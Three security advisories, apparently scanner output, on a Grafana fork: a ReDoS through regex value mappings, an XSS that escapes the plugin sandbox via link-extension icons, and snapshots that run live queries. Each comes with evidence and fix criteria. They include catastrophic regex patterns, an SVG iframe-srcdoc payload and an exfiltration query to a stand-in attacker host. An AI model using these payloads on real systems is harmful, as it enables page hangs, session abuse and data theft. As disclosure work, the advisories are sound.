# Regex value mappings from dashboard or datasource field config are compiled unvalidated and run per rendered value (viewer ReDoS)

## Details
Grafana field value mappings include a 'Regex' type (MappingType.RegexToText = 'regex', a documented option: docs/sources/shared/visualizations/value-mappings-options.md). The display processor attached to every field (recovered @grafana/data displayProcessor.ts:90-107, attached in fieldOverrides.ts:223-231) calls getValueMappingResult(config.mappings, value) for every value it renders, and that function (recovered valueMappings.ts:54-72) compiles `vm.options.pattern` with stringToJsRegex — `new RegExp('^' + pattern + '$')`, or the verbatim `/…/flags` form — and runs value.match()/value.replace() against the cell value. Nothing validates the pattern, bounds the value length or limits execution time; the editor stores the pattern verbatim (ValueMappingEditRow.tsx:118) and valueMappingsOverrideProcessor returns it unchanged (recovered processors.ts:77-83).

Primary route — a dashboard Editor (threat-model adversary 3): adds a regex value mapping such as `(.*)*X` or `(\s*)*$` to a string field via the standard 'Value mappings' option (fieldConfig.defaults.mappings or an override with id 'mappings'). Against ordinary datasource strings of roughly 30+ characters that do not match, V8's backtracking matcher takes exponential time; every Viewer, Editor or Admin who opens the dashboard (or a library panel/public dashboard/snapshot carrying the same fieldConfig) has the main thread blocked while the table, stat, gauge, legend or tooltip renders. This is a deterministic, input-driven hang of the Grafana page, not a volumetric effect. The same JSON can also be supplied by anyone allowed to POST /api/snapshots (the UI gates on snapshots:create) and shared as a snapshot link.

Secondary, conditional route — datasource-supplied field config (adversary 4): frame JSON from /api/ds/query carries per-field `config`; dataFrameFromJSON keeps it (recovered DataFrameJSON.ts:206) and applyFieldOverrides keeps datasource-set properties, with setFieldConfigDefaults filling only what is unset (fieldOverrides.ts:185, 421-468). A datasource that attaches `mappings: [{type:'regex', options:{pattern:'(.*)*X', result:{text:'x'}}}]` to a string field therefore drives the same ReDoS in dashboards and in Explore (TableContainer.tsx:146) with no Grafana privileges. No bundled plugin was found in readable code to pass upstream content into field config (their backends are ELF binaries), so this route holds only for a datasource plugin that does; it is not what the metrics are rated on.

Assumptions: @grafana/data and @grafana/ui as bundled in public/build/6540.*.js.map and @grafana/scenes in 7606.*.js.map are the code dashboards execute (read from source maps, not installed); V8's irregexp engine (Chromium/Firefox-equivalent) backtracks exponentially on `^(.*)*X$` against a non-matching 30-40 character string.

## Evidence
1. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered packages/grafana-data/src/utils/valueMappings.ts lines 54-72: for MappingType.RegexToText ('regex'), getValueMappingResult calls stringToJsRegex(vm.options.pattern) and then value.match(regex) and value.replace(regex, …) for every string value, with no pattern validation, value-length bound or timeout. Recovered packages/grafana-data/src/text/string.ts lines 32-44 (stringToJsRegex): a bare pattern becomes new RegExp(`^${str}$`), a /…/flags pattern is compiled verbatim, so nested-quantifier patterns such as `(.*)*X` or `(\s*)*$` are accepted. This is the code the fix must change.
2. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered packages/grafana-data/src/field/displayProcessor.ts lines 90-107: the display processor returned for every field reads `config.mappings` and calls getValueMappingResult(mappings, value) on every value it formats. Recovered fieldOverrides.ts lines 223-231 attach this processor as field.display for every field passing through applyFieldOverrides; the cachingDisplayProcessor (2500 entries) caches by value and does not help on the first evaluation or for distinct values.
3. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   How untrusted mappings reach field.config: recovered fieldOverrides.ts line 185 and setFieldConfigDefaults lines 421-468 ('config -> from DS') set a property from the panel defaults only when `currentConfig == null`, so a `config.mappings` array the datasource put on the frame is kept; lines 398-405 merge override-rule mapping arrays ahead of the defaults. Recovered field/overrides/processors.ts lines 77-83: valueMappingsOverrideProcessor returns the dashboard's mappings value unchanged. Recovered dataframe/DataFrameJSON.ts line 206: dataFrameFromJSON keeps `config: f.config ?? {}` from the /api/ds/query frame JSON (StreamingDataFrame.ts 162/247 likewise).
4. [public/app/features/dimensions/editors/ValueMappingsEditor/ValueMappingEditRow.tsx:116–119](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dimensions/editors/ValueMappingsEditor/ValueMappingEditRow.tsx#L116-L119)
   The Editor-facing 'Regex' value-mapping row stores whatever the Editor types as `mapping.pattern` verbatim; ValueMappingsEditorModal.tsx (recovered, lines 273-278, 328-333) copies it into `{type:'regex', options:{pattern}}` in the panel fieldConfig. No validation of the pattern exists anywhere on the path.
5. [public/app/features/query/state/PanelQueryRunner.ts:186–190](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/query/state/PanelQueryRunner.ts#L186-L190)
   Every dashboard panel's data passes through applyFieldOverrides with the panel's fieldConfig (defaults + overrides) here and in the equivalent @grafana/scenes VizPanel.js line 384 (recovered from public/build/7606.e8e4d98948a4bb1cf3bc.js.map), so Editor-authored and datasource-supplied mappings reach field.display for every user who opens the dashboard.
6. [public/app/features/explore/Table/TableContainer.tsx:146](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/Table/TableContainer.tsx#L146)
   Explore's table applies applyFieldOverrides to raw datasource frames with empty defaults/overrides, so a datasource-supplied `config.mappings` of regex type is honoured in Explore as well (also LogsTable.tsx:146, NodeGraphContainer.tsx:49).
7. [public/app/features/visualization/data-hover/DataHoverView.tsx:43–45](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/visualization/data-hover/DataHoverView.tsx#L43-L45)
   Example sink: the hover tooltip calls field.display(value) for every visible field of the hovered row. Table cells do the same for every rendered cell (recovered @grafana/ui TableNG hooks.ts:1042, utils.ts:509/626/885/1247), and stat/gauge/bar-gauge values go through recovered fieldDisplay.ts (field.display per value).

## Impact
The Grafana page becomes unresponsive in the browser of every user who opens the affected dashboard, Explore table or snapshot and must be killed/reloaded; the dashboard stays unusable for all its viewers until the mapping or data is changed, which the attacker controls. The server is unaffected. No confidentiality or integrity impact.

## Reproduction steps
1. A dashboard Editor (basic Editor role) adds a Regex value mapping with a catastrophic pattern to a string field — a standard, documented panel option — and saves. Any user who opens the dashboard renders the values, and the display processor evaluates the regex per cell; no interaction beyond normal viewing is needed. Default configuration; no shipped control (pattern validation, timeout, length bound) exists to defeat. A datasource that emits config.mappings would reach the same sink with no privileges, but that route is conditional on such a plugin and is not rated here.

## Recommended fix
1. getValueMappingResult compiles an untrusted regex pattern from field config (dashboard- or datasource-supplied) with stringToJsRegex and executes it against every rendered value with no pattern validation, input bound or linear-time guarantee. Fix criteria: Regex value mappings must not allow super-linear matching on attacker-chosen patterns/values: reject or neutralise nested-quantifier/ambiguous patterns when a mapping is saved and when it is evaluated, cap the length of the value matched, or evaluate with a linear-time engine; compile the pattern once per field rather than per value. Verify that a string field with mapping pattern `(.*)*X` and 40-character non-matching values renders in bounded time.
2. applyFieldOverrides honours `config.mappings` arriving on datasource frames (setFieldConfigDefaults only fills unset properties) with no validation of datasource-supplied regex mappings. Fix criteria: Datasource-supplied regex value mappings are subject to the same pattern/length safeguards as dashboard-authored ones (or are not honoured), so that a frame carrying a catastrophic regex mapping cannot hang the viewer's browser in dashboards or Explore.

---
**Severity:** HIGH
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256421

---

# Plugin extension link icon rendered as inline SVG markup by host Menu/Button, enabling host-realm script

## Details
Plugin link extensions (`AppPlugin.addLink` / `PluginExtensionAddedLinkConfig`) carry an `icon` property typed `IconName` that the host never validates. `AddedLinksRegistry.mapToRegistry` spreads the plugin's config — `icon` and `group.icon` included — into the registry (AddedLinksRegistry.ts:83-92); `getLinkExtensionOverrides` lets the plugin's `configure()` callback replace `icon` at render time with any value, asserting only title/description are strings (utils.tsx:430-466); `addedLinkToExtensionLink` forwards `icon: overrides?.icon ?? addedLink.icon` to consumers (utils.tsx:585). Host code then renders that string through components that hand it straight to `@grafana/ui` `Icon`: every dashboard panel menu (`PanelMenuBehavior.tsx:311-334` → `extensionLinkToPanelMenuItem` → `iconClassName` → scenes `VizPanelMenu` → `Menu.Item icon`), the Explore toolbar 'Add'/queryless menu (`ToolbarExtensionPointMenu.tsx:40`), the alert-rule 'More' menu (`AlertRuleMenu.tsx:188`) and the trace-view header buttons (`TracePageHeader.tsx:238` via `Button`'s `IconRenderer`). Recovered `MenuItem.tsx:218-224` and `Button.tsx:225-236` contain no `isIconName` check, and `Icon.tsx:98-100` only `console.warn`s before concatenating the name into `src = public/build/img/icons/<subdir>/<name>.svg` for react-inlinesvg, which treats any `src` containing `<svg` as inline markup, parses it as text/html (selecting the `<svg>` element past the leading path text) and converts it attribute-for-attribute into React elements, mapping `srcdoc` to `srcDoc`. A plugin that registers `icon: '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="1" height="1"><iframe srcdoc="&lt;script&gt;...&lt;/script&gt;"></iframe></foreignObject></svg>'` therefore has the host render a same-origin `about:srcdoc` iframe whose script runs in the Grafana origin, in the host realm (not the plugin's near-membrane realm), with the victim's session: it can read `parent.window.grafanaBootData`, call the API with the victim's cookie and rewrite the host DOM.

Boundary crossed: the frontend sandbox (`enable_frontend_sandbox_for_plugins`, docs/sources/administration/plugin-management/plugin-frontend-sandbox.md) is the shipped hardening mode for third-party plugins, and its distortions exist precisely to deny plugin code iframes — `sandbox/constants.ts` `forbiddenElements = ['iframe']`, `distortions.ts:103-130` makes `iframe.src/srcdoc/contentWindow/contentDocument` throw for sandboxed code, the sandbox README says distortions 'revolve around preventing plugins from creating forbidden elements (iframes)'. This path has the host build the `<iframe srcdoc>` from a plain string the plugin handed it, outside any distortion, so a sandboxed plugin gains unrestricted host-realm script. For a plugin the operator has not sandboxed the gain is nil (it already runs in the host realm), so the finding's weight is the sandbox bypass; attack_requirements is PRESENT for that reason. The verified `extension-link-path-scheme-unvalidated-javascript-url` record covers the sibling `path` property reaching `window.open`; this record covers a different source property (`icon`), a different sink class (host React render of inline SVG), and a sink (the panel menu) reached by every viewer who opens any panel menu, without clicking the plugin's own entry.

Attack path: a third-party app plugin (threat-model adversary 5) installed by the operator and listed in `enable_frontend_sandbox_for_plugins` registers a link targeting `grafana/dashboard/panel/menu` (or `grafana/explore/toolbar/action`, `grafana/alerting/alertingrule/action`, `grafana/traceview/header/actions`) with the crafted `icon`, statically or from `configure()`. Any signed-in user who opens a panel menu on any dashboard (or the Explore 'Add' menu, an alert rule's menu, or a trace view, where the header Button renders on load) has the markup rendered. CSP is off by default (established fact), so the inline srcdoc script is not blocked.

Not exploitable through: the datasource-config Explore dropdown (`EditDataSourceActions.tsx:92`) because `ALLOWED_DATASOURCE_EXTENSION_PLUGINS` (datasources/constants.ts:24-32) restricts it to Grafana-authored apps, which are Grafana-signed and not sandbox-eligible (`isPluginSignatureEligibleForSandbox`); the HomepageTabs extension point, which validates icons with `z.string().refine(isIconName)` (home/DashboardTabs/types.ts:9); and `ToolbarButton`/`Sidebar.Button`, which gate on `isIconName` (recovered ToolbarButton.tsx:135, SidebarButton.tsx:62).

Dependency assumptions (packages not in checkout, read from the bundled source maps named in the evidence): @grafana/ui Icon/MenuItem/Button and @grafana/data isIconName as recovered in public/build/6540.a30454ce5fbe65a84f5f.js.map; react-inlinesvg and react-from-dom as recovered in public/build/7606.e8e4d98948a4bb1cf3bc.js.map; @grafana/scenes VizPanelMenu passing `iconClassName` as `Menu.Item icon` (same map); React 19.2.8 sets `srcDoc` as the `srcdoc` attribute and does not block it.

## Evidence
1. [public/app/features/plugins/extensions/registry/AddedLinksRegistry.ts:83–91](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/registry/AddedLinksRegistry.ts#L83-L91)
   mapToRegistry validates only title, configure, path/onClick and (dev-mode only) meta info, then spreads the rest of the plugin-supplied config — including `icon` and `group.icon`, typed IconName but never checked with isIconName — into the registry (`{ ...rest, category, group, pluginId, extensionPointId }`). This is the in-tree point where the plugin's icon string enters host state unvalidated; the root-cause fix belongs here (and in the configure() override path).
2. [public/app/features/plugins/extensions/utils.tsx:430–465](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/utils.tsx#L430-L465)
   getLinkExtensionOverrides lets the plugin's configure() callback replace `icon` (and `group`) at render time with any value; only title and description are asserted to be strings (assertStringProps), so a plugin can also inject the SVG markup dynamically per context.
3. [public/app/features/plugins/extensions/utils.tsx:585](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/utils.tsx#L585)
   addedLinkToExtensionLink builds the PluginExtensionLink consumers receive with `icon: overrides?.icon ?? addedLink.icon` — no allow-list check; this is the value every host sink below renders.
4. [public/app/features/dashboard/utils/appendExtensionsToPanelMenu.ts:147–154](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/utils/appendExtensionsToPanelMenu.ts#L147-L154)
   extensionLinkToPanelMenuItem copies `extension.icon` verbatim into the PanelMenuItem's `iconClassName` (line 152); lines 125 and 138 do the same for `group.icon` on submenu groups. @grafana/scenes VizPanelMenuRenderer (recovered node_modules/@grafana/scenes/dist/esm/components/VizPanel/VizPanelMenu.js line 43 in public/build/7606.e8e4d98948a4bb1cf3bc.js.map) renders each item as `Menu.Item icon={item.iconClassName}`.
5. [public/app/features/dashboard-scene/scene/PanelMenuBehavior.tsx:311–333](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/PanelMenuBehavior.tsx#L311-L333)
   Every dashboard panel menu resolves link extensions for PluginExtensionPoints.DashboardPanelMenu ('grafana/dashboard/panel/menu') and, when the dashboard is not in edit mode, appends them via appendExtensionsToPanelMenu; any viewer who opens any panel's menu on any dashboard renders the plugin's icon string without selecting the plugin's item.
6. [public/app/features/explore/extensions/ToolbarExtensionPointMenu.tsx:36–49](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/extensions/ToolbarExtensionPointMenu.tsx#L36-L49)
   Explore toolbar 'Add' / queryless menu renders `<Menu.Item icon={extension?.icon || 'plug'}>` for every link extension at 'grafana/explore/toolbar/action'; mounted by public/app/features/explore/extensions/toolbar/BasicExtensions.tsx:37 and toolbar/QuerylessAppsExtensions.tsx:18.
7. [public/app/features/alerting/unified/components/rule-viewer/AlertRuleMenu.tsx:187–189](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/rule-viewer/AlertRuleMenu.tsx#L187-L189)
   Alert rule 'More' menu renders `<Menu.Item icon={extension.icon}>` for 'grafana/alerting/alertingrule/action' link extensions (useRulePluginLinkExtension, line 97); same sink.
8. [public/app/features/explore/TraceView/components/TracePageHeader/TracePageHeader.tsx:232–239](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TracePageHeader/TracePageHeader.tsx#L232-L239)
   Trace view header renders `<Button icon={link.icon}>` for 'grafana/traceview/header/actions' link extensions (usePluginLinks, line 140) as soon as the trace view opens — no menu click needed; Button's IconRenderer passes a string icon straight to Icon (recovered Button.tsx 225-236).
9. [public/app/features/plugins/sandbox/distortions.ts:103–129](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L103-L129)
   The shipped control this path acts around: distortIframeAttributes makes iframe.src/srcdoc/contentWindow/contentDocument throw for sandboxed plugin code, and constants.ts declares forbiddenElements = ['iframe'] (README: distortions 'revolve around preventing plugins from creating forbidden elements (iframes)'). Here the host itself builds the <iframe srcdoc> from the plugin's icon string, outside any distortion.
10. [public/app/features/home/DashboardTabs/types.ts:9](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/home/DashboardTabs/types.ts#L9)
   Contrast: the HomepageTabs extension point validates plugin-supplied icons with `z.string().refine(isIconName)`, showing the maintainers treat plugin icon names as needing validation; the added-links pipeline lacks the equivalent.
11. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered @grafana/ui sources: Menu/MenuItem.tsx 218-224 renders `<Icon name={icon}>` with no isIconName gate; Button/Button.tsx IconRenderer 225-236 likewise; Icon/Icon.tsx 98-100 only console.warn()s on an unknown name, then getIconPath (Icon/utils.ts 64-67) builds `${iconRoot}${subDir}/${name}.svg` and passes it as `src` to react-inlinesvg (Icon.tsx 132). isIconName (grafana-data/src/types/icon.ts) is a plain `in availableIconsIndex` lookup. ToolbarButton.tsx:135 and Sidebar/SidebarButton.tsx:62 do gate on isIconName, so only Menu.Item/Button sinks are exploitable.
12. [public/build/7606.e8e4d98948a4bb1cf3bc.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/7606.e8e4d98948a4bb1cf3bc.js.map) (whole file)
   Recovered node_modules/react-inlinesvg/dist/index.mjs 237-247: `else if (src.includes("<svg")) inlineSrc = src;` treats the whole src string as inline markup; getNode (33-39) calls react-from-dom convert(svgText, { nodeOnly: true }) which parses with DOMParser text/html and selects `body > *` (so the leading `public/build/img/icons/unicons/` text node is skipped and the <svg> SVGSVGElement is selected), then convert(node) turns every element into React.createElement(name, attrs) with attribute names mapped through possibleStandardNames (`srcdoc: "srcDoc"`, line 115), so `<svg><foreignObject><iframe srcdoc=...>` becomes a React <iframe srcDoc> rendered in the host document.

## Impact
The script runs same-origin in the host document (about:srcdoc inherits the Grafana origin; parent is the real, undistorted host window), so it reads window.grafanaBootData and non-HttpOnly storage, issues session-authenticated API calls as the victim (read dashboards, datasource settings, alerting config; change whatever the victim's role permits, up to admin actions for an admin victim) and rewrites the host UI — defeating every guarantee the frontend sandbox makes for that plugin. Availability impact is limited to defacing or hanging the victim's tab.

## Reproduction steps
1. Attacker is the author of a third-party app plugin that the operator has installed and listed in enable_frontend_sandbox_for_plugins (AT:P: the plugin must be installed and, for the boundary crossing to matter, sandboxed). The plugin registers a panel-menu link extension whose `icon` is an `<svg>` string carrying `<foreignObject><iframe srcdoc=...>`, statically or via configure(); the near-membrane passes strings unchanged and AddedLinksRegistry/getLinkExtensionOverrides/addedLinkToExtensionLink apply no isIconName check. A signed-in victim opens any panel's menu on any dashboard (routine use, UI:P); the host's Menu.Item -> Icon -> react-inlinesvg renders the markup in the host realm and the about:srcdoc script runs in the Grafana origin with the victim's session. No sanitizer is on the path and CSP is off by default (AC:L). The plugin holds only the low-trust position of sandboxed plugin code (PR:L).

## Recommended fix
1. The added-links pipeline (AddedLinksRegistry.mapToRegistry, getLinkExtensionOverrides, addedLinkToExtensionLink) accepts and propagates plugin-supplied `icon` and `group.icon` values without checking they are known icon names, so arbitrary strings reach the host's Icon renderer via Menu.Item and Button. Fix criteria: Every icon value originating from a plugin extension (initial addLink config, configure() override, group.icon) is validated with isIconName (or an equivalent allow-list) at registration and at override time, and unknown values are dropped or replaced with a default; a plugin registering `icon: '<svg ...>'` must render the fallback icon and never produce inline SVG or an iframe in the host DOM.
2. @grafana/ui Menu.Item and Button (IconRenderer) pass the `icon` prop to Icon without the isIconName gate that ToolbarButton and Sidebar.Button apply, and Icon itself only warns on unknown names before handing them to react-inlinesvg as a src, which inlines any string containing `<svg`. Fix criteria: Icon (or at minimum MenuItem and Button's IconRenderer) refuses to render names that are not in availableIconsIndex, so a name containing `<svg` can never be passed to react-inlinesvg; rendering `<Menu.Item icon={'<svg ...>'}>` must produce no SVG markup from the string.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256418

---

# Snapshot viewer executes live datasource queries carried in snapshot JSON with the viewer's session

## Details
Grafana documents snapshots as static copies: "A dashboard snapshot publicly shares a dashboard while removing sensitive data such as queries and panel links, leaving only visible metrics and series names" (docs/sources/visualizations/dashboards/share-dashboards-panels/_index.md:120). That stripping happens only in the author's browser: `vizPanelDataToPanel(..., isSnapshot=true)` (transformSceneToSaveModel.ts:342-359) replaces each panel's targets with one grafana-datasource `queryType: 'snapshot'` target carrying embedded frames, and the grafana datasource serves such targets locally (plugins/datasource/grafana/datasource.ts:97-107). `SnapshotSrv.create` is a thin `POST /api/snapshots` wrapper (SnapshotSrv.ts:53) whose body is `dashboard: Unstructured` per public/api-merged.json ("you have to provide the full dashboard payload"), so a caller can store any panel JSON.

The viewer side trusts that body as if it were an Editor-authored dashboard. `/dashboard/:type/:slug` with type `snapshot` is `allowAnonymous` (routes.tsx:107-115); `DashboardScenePage` calls `stateManager.loadSnapshot(slug)` -> `loadSnapshotScene` (DashboardScenePageStateManager.ts:664-680), which hands `/api/snapshots/<key>` straight to `transformSaveModelToScene`. In `createSceneObjectsForPanels` only panels still carrying legacy `snapshotData` are converted to the grafana snapshot datasource (transformSaveModelToScene.ts:216-223); every other panel goes to `buildGridItemForPanel` -> `createPanelDataProvider`, which builds a `SceneQueryRunner` from `panel.datasource`/`panel.targets` unconditionally (createPanelDataProvider.ts:24-37). The recovered @grafana/scenes `SceneQueryRunner` (public/build/7606.*.js.map, querying/SceneQueryRunner.js:238-253, 452-487) runs on activation: `getDataSource(ref)` -> `runRequest(ds, request)` -> `ds.query()` -> `/api/ds/query` with the viewer's session. No `isSnapshot` check exists anywhere on this path (the only viewer-side uses of `meta.isSnapshot` are variables, annotations and `canEditDashboard`).

The project itself treats snapshot bodies as lower-trust than dashboards on every *other* live surface: variables become static `SnapshotVariable`s instead of query variables (utils/variables.ts:112-140), annotation queries are skipped when `isSnapshot()` (transformSaveModelToScene.ts:310), and `canExecuteActions` is false because `canEditDashboard()` returns `!isSnapshot && ...` (DashboardScene.tsx:1226-1231, setDashboardPanelContext.ts:205). Panel queries are the one live surface left un-gated.

Attack: a user holding `snapshots:create` (the Share -> Snapshot entry is shown on exactly that permission, ShareMenu.tsx:85; the recorded threat model places snapshot creation with the Viewer role; Viewer lacks `datasources:explore`, which the RBAC docs grant via `fixed:datasources:explorer` to Editor only, and lacks `dashboards:create`) POSTs a `dashboard` whose panels carry arbitrary targets. No datasource UID knowledge is needed: `DatasourceSrv.getInstanceSettings` resolves a ref with no uid to the victim's default datasource, a `{type}`-only ref to the first datasource of that type (datasource_srv.ts:119-128), and names resolve as well. The attacker sends `/dashboard/snapshot/<key>` to an Editor/Admin; on open the victim's browser executes the attacker's queries (SQL `rawSql`, PromQL `expr`, ...) against datasources the attacker cannot query, with the victim's datasource permissions. Exfiltration needs no click: a table panel with the `image` cell type renders `<img src={field.display(value).text}>` (recovered @grafana/ui ImageCell in public/build/6540.*.js.map), so `SELECT CONCAT('https://attacker/', secret)` makes the victim's browser fetch the secret to the attacker (CSP is off by default). Mutating SQL runs if the datasource credentials allow it. With `[snapshots] public_mode = true` (non-default) the body can also be stored unauthenticated.

Assumptions (backend absent): the Go snapshot API stores `dashboard` verbatim and returns it with `meta.isSnapshot = true`; `/api/ds/query` enforces only the caller's datasource permissions; `snapshots:create` is held by the Viewer basic role (this checkout's RBAC docs list the action but not the fixed:snapshots roles' basic-role grants); @grafana/scenes behaves as its recovered source shows. This is distinct from the verified author-side trim records (`snapshot-collapsed-row-panels-keep-raw-queries`, `snapshot-trim-keeps-query-variable-definition`, v2 trim records), which concern queries *leaking into* a snapshot; here the viewer side *executes* queries carried in one. The frontend is the only place in this checkout that can refuse to run non-snapshot queries in snapshot mode, so the finding is filed against the scene builder.

## Evidence
1. [public/app/features/dashboard-scene/serialization/transformSaveModelToScene.ts:216–222](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSaveModelToScene.ts#L216-L222)
   createSceneObjectsForPanels converts only panels carrying legacy `snapshotData` to the grafana snapshot datasource (convertOldSnapshotToScenesSnapshot); every other snapshot panel is passed to buildGridItemForPanel with whatever `datasource`/`targets` the stored body carries. Nothing checks that a snapshot panel's queries are grafana `queryType: 'snapshot'` targets. This is where the fix belongs.
2. [public/app/features/dashboard-scene/utils/createPanelDataProvider.ts:24–36](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/utils/createPanelDataProvider.ts#L24-L36)
   Builds a SceneQueryRunner from panel.datasource (or the first target's datasource) and panel.targets unconditionally; the recovered @grafana/scenes SceneQueryRunner runs on activation via getDataSource -> runRequest -> ds.query() -> /api/ds/query with the viewer's cookies.
3. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:664–679](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L664-L679)
   loadSnapshotScene fetches /api/snapshots/<key> via dashboardLoaderSrv.loadSnapshot and hands the body straight to transformSaveModelToScene; the only snapshot-specific handling is the v1 layout option and meta.snapshotKey. No per-panel validation of datasource/targets.
4. [public/app/features/dashboard-scene/scene/DashboardScene.tsx:1226–1231](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/DashboardScene.tsx#L1226-L1231)
   canEditDashboard() returns false for isSnapshot, which is what setDashboardPanelContext.canExecuteActions relies on: the project already treats snapshot content as untrusted for field actions, but no equivalent gate exists for panel queries.
5. [public/app/features/dashboard-scene/utils/variables.ts:112–140](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/utils/variables.ts#L112-L140)
   createVariablesForSnapshot turns every non-adhoc variable into a static SnapshotVariable instead of a live query variable — the viewer-side builder deliberately refuses to run variable queries from a snapshot body, while panel queries from the same body are run.
6. [public/app/features/plugins/datasource\_srv.ts:119–128](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/datasource_srv.ts#L119-L128)
   getInstanceSettings resolves a datasource ref with no uid to the victim's default datasource and a type-only ref to the first datasource of that type, so the snapshot author needs no datasource UID to target the victim's datasources.
7. [public/app/features/dashboard/services/SnapshotSrv.ts:53–69](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/services/SnapshotSrv.ts#L53-L69)
   create() POSTs an arbitrary `dashboard` object to /api/snapshots; getSnapshot() returns the stored body verbatim (only meta.canShare is cleared). The frontend's query scrubbing runs only in the author's browser and is bypassed by calling the API directly.
8. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts:342–358](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts#L342-L358)
   Shows the legitimate snapshot panel shape the author-side trim produces (datasource = grafana, single target with queryType 'snapshot' and embedded frames). The viewer side never enforces this shape.
9. [public/app/routes/routes.tsx:107–114](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/routes/routes.tsx#L107-L114)
   /dashboard/:type/:slug is allowAnonymous when type === 'snapshot'; any logged-in user who follows a snapshot link renders it with their own session, and anonymous visitors render it too.

## Impact
Confidentiality: attacker-chosen queries run through Grafana's /api/ds/query against datasources the attacker is not permitted to query, and the results are exfiltrated automatically via the table image cell (<img src=value>) or data links interpolating returned values — a full bypass of Grafana's per-datasource query authorization for whatever the victim can reach. Integrity: no Grafana-managed state is modified by this path (writes land in the backing datasources, rated under subsequent system). Availability: none. Subsequent-system impact: Queries are proxied by Grafana to the backing datasources with their stored credentials: the attacker reads arbitrary data from databases/metric stores the victim can reach, and on SQL datasources whose credentials permit it can issue mutating statements (INSERT/UPDATE/DELETE) with the victim's authority.

